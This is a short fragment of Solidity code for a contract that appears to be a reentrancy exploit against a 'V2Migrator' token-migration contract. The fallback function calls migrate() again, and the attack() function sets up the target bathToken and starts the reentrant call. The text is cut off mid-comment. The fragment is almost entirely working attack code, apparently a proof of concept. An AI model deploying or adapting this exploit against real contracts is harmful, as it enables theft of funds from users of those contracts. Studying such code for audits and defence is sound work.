    IV2Migrator migrator;
    IBathToken bathToken;

    constructor(address _migrator) {
        migrator = IV2Migrator(_migrator);
    }

    // fallback function 
    fallback() external payable {
        migrator.migrate(bathToken);
    }

    // Attack function to initiate reentrancy attack
    function attack(address _bathTokenV2, uint256 _amount) external {
        // Initialize the bathToken instance variable with the address of the bathTokenV2 contract
        bathToken = IBathToken(_bathTokenV2);
        // Call the V2Migrator contrac
